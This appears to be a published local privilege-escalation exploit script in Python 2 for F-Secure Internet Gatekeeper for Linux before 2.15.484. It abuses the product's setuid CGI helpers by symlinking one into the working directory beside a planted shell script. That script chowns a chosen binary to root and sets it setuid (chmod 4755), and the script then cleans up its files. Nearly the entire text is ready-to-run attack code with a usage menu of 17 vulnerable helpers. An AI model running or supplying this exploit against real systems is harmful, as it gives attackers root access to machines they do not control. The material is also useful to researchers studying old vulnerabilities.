F-Secure Internet Gatekeeper for linux < 2.15.484 Local Root Exploit
====================================================================



#!/usr/bin/env python
#
# F-Secure Anti-Virus Internet Gatekeeper for Linux <2.15.484 
# F-Secure Anti-Virus Linux Gateway <2.16 # added line 3-4 for references /str0ke
#
##############################################################################
##  fsigk_exp.py: F-Secure Internet Gatekeeper for Linux local root exploit
##  acknowledgements: everyone in pure-elite and uDc.
##
##  coded by: xavier@tigerteam.se [http://xavsec.blogspot.com]
##############################################################################

##############################################################################
##  Make proper checks and import nessesary calls from modules.
##

try: 
    from sys import argv
except Exception: 
    print "the &#039;sys&#039; module could not be loaded"
    raise SystemExit

try: 
    from os import unlink, stat, error, symlink, system, chmod
except Exception:
     print "the &#039;os&#039; module could not be loaded"
     raise SystemExit

try: 
    import getopt
except Exception: 
    print "the &#039;getopt&#039; module could not be loaded"
    raise SystemExit

##############################################################################
##  Constants.
##

__program__ = argv[0]
__version__ = "0.1beta"
__author__ = "<xavier@tigerteam.se>"
__lastedit__ = "Thu Sep 22 23:18:39 EDT 2005"
__usage__ = """usage: %s [-options]

options:
       --version  show program&#039;s version number and exit.
      -h, --help  show this help message and exit.

      -s, --suid  file location to suid.
       -d, --dir  cgi directory.
     -c, --clean  cleans any left over files from the environment creation.
              -#  enter numerical value of vulnerable file to exploit. [list below]

 1: ifconfig_suid.cgi  |  2: reboot_suid.cgi     |  3: proxy_suid.cgi
 4: edittmpl_suid.cgi  |  5: version_suid.cgi    |  6: hostname_suid.cgi
 7: gateway_suid.cgi   |  8: halt_suid.cgi       |  9: edituserdb_suid.cgi
10: htpasswd_suid.cgi  | 11: pattern_up_suid.cgi | 12: license_suid.cgi
13: iptables_suid.cgi  | 14: dns_suid.cgi        | 15: pattern_autoup_suid.cgi
16: spam_list_suid.cgi | 17: diag_suid.cgi""" % (__program__)

#######################################################################################
## Functions.
##

def _write(file, payload):
    try: 
        open(file, &#039;w&#039;).write(payload)
        chmod(file, 0100)
    except Exception, err: 
        print ("[-] %s" % (err))

def _exists(path):
    try: 
        stat(path)
    except error:
        return False
    return True

def _handleopts():
    for opt in argv[1:]:
        if opt in ("-h", "--help"): 
            print "%s" % (__usage__),
            raise SystemExit
        if opt in ("-v", "--version"): 
            print "%s (%s)" % (__version__, __lastedit__),
            raise SystemExit

    _method_ = &#039;ifconfig_suid.cgi&#039;
    _file_ = &#039;ifconfig.cgi&#039;
    for opt in argv[1:]:
        if opt == "-1": 
            _method_ = &#039;ifconfig_suid.cgi&#039;
        elif opt == "-2": 
            _method_ = &#039;reboot_suid.cgi&#039;
            _file_ = &#039;reboot.cgi&#039;
        elif opt == "-3": 
            _method_ = &#039;proxy_suid.cgi&#039;
            _file_ = &#039;proxy.cgi&#039;
        elif opt == "-4": 
            _method_ = &#039;edittmpl_suid.cgi&#039;
            _file_ = &#039;edittmpl.cgi&#039;
        elif opt == "-5": 
            _method_ = &#039;version_suid.cgi&#039;
            _file_ = &#039;version.cgi&#039;
        elif opt == "-6": 
            _method_ = &#039;hostname_suid.cgi&#039;
            _file_ = &#039;hostname.cgi&#039;
        elif opt == "-7": 
            _method_ = &#039;gateway_suid.cgi&#039;
            _file_ = &#039;gateway.cgi&#039;
        elif opt == "-8": 
            _method_ = &#039;halt_suid.cgi&#039;
            _file_ = &#039;halt.cgi&#039;
        elif opt == "-9": 
            _method_ = &#039;edituserdb_suid.cgi&#039;
            _file_ = &#039;edituserdb.cgi&#039;
        elif opt == "-10": 
            _method_ = &#039;htpasswd_suid.cgi&#039;
            _file_ = &#039;htpasswd.cgi&#039;
        elif opt == "-11": 
            _method_ = &#039;pattern_up_suid.cgi&#039;
            _file_ = &#039;pattern_up.cgi&#039;
        elif opt == "-12": 
            _method_ = &#039;license_suid.cgi&#039;
            _file_ = &#039;license.cgi&#039;
        elif opt == "-13":
            _method_ = &#039;iptables_suid.cgi&#039;
            _file_ = &#039;iptables.cgi&#039;
        elif opt == "-14": 
            _method_ = &#039;dns_suid.cgi&#039;
            _file_ = &#039;dns.cgi&#039;
        elif opt == "-15": 
            _method_ = &#039;pattern_autoup_suid.cgi&#039;
            _file_ = &#039;pattern_autoup.cgi&#039;
        elif opt == "-16": 
            _method_ = &#039;spam_list_suid.cgi&#039;
            _file_ = &#039;spam_list.cgi&#039;
        elif opt == "-17": 
            _method_ = &#039;diag_suid.cgi&#039;
            _file_ = &#039;diag.cgi&#039;
        else: 
            pass

    try:
        opts = getopt.getopt(argv[1:], &#039;c1234567890s:d:&#039;, [&#039;clean&#039;, \
                                                          &#039;suid=&#039;, \
                                                          &#039;dir=&#039;])[0]
    except Exception, (err):
        print "[-] %s" % (err),
        raise SystemExit

    _dir_ = None
    _payload_ = None
    _combine_ = None

    for o, a in opts:
        if o in ("-c", "--clean"): 
            _clean()
            print "[*] done"
            raise SystemExit
        if o in ("-d", "--dir"): 
            if _exists(a): 
                _dir_ = a
            else: 
                print "[-] unable to access the %s directory" % (_dir_),
                raise SystemExit
        if o in ("-s", "--suid"): 
            if _exists(a): 
                _payload_ = _suid(a)
            else: 
                print "[-] unable to access binary."
                raise SystemExit

    if _dir_ == None: 
        print "[-] no directory was given [try -h for help menu]"
        raise SystemExit
    if _payload_ == None: 
        print "[-] enter binary to suid [try -h for help menu]"
        raise SystemExit
    _combined_ = "%s/%s" % (_dir_, _method_)
    if not _exists(_combined_): 
        print "[-] method not possible, try another."
        raise SystemExit

    print "[*] creating environment..."
    try:
        symlink(&#039;%s/%s&#039; % (_dir_, _method_), &#039;runbad&#039;)
        _write(_file_, _payload_)
    except Exception, err:
        raise SystemExit


def _suid(file):
    _suid_ = """#!/bin/sh
chown 0.0 %(file)s
chmod 4755 %(file)s
""" % (locals())
    return _suid_


def _clean():
    try:
        files = [&#039;runbad&#039;, &#039;ifconfig.cgi&#039;, &#039;reboot.cgi&#039;, &#039;proxy.cgi&#039;, 
                 &#039;edittmpl.cgi&#039;, &#039;version.cgi&#039;, &#039;hostname.cgi&#039;, &#039;gateway.cgi&#039;,
                 &#039;halt.cgi&#039;, &#039;edituserdb.cgi&#039;, &#039;htpasswd.cgi&#039;, &#039;pattern_up.cgi&#039;,
                 &#039;license.cgi&#039;, &#039;iptables.cgi&#039;, &#039;dns.cgi&#039;, &#039;pattern_autoup.cgi&#039;, 
                 &#039;spam_list.cgi&#039;, &#039;diag_suid.cgi&#039;]

        for file in files:
            if _exists(file): unlink(file)

    except Exception, err:
        print "[-] %s" % (err),


##############################################################################
##  main() // main code.
##

def main():
    try:
        print "[INFO] F-Secure Internet Gatekeeper for Linux <=2.10-431 local exploit by %s" % (__author__)
        print "[*] handling options, arguments..."
        _handleopts()
        print "[*] executing exploit..."
        system(&#039;./runbad&#039;)
        print "[*] cleaning..."
        _clean()
        print "[*] done... try executing the specified binary."
    except KeyboardInterrupt:
        print "[-] caught keyboard interuption"
        raise SystemExit
    except Exception, (err): 
        _clean()
        raise SystemExit

if __name__ == &#039;__main__&#039;: main()



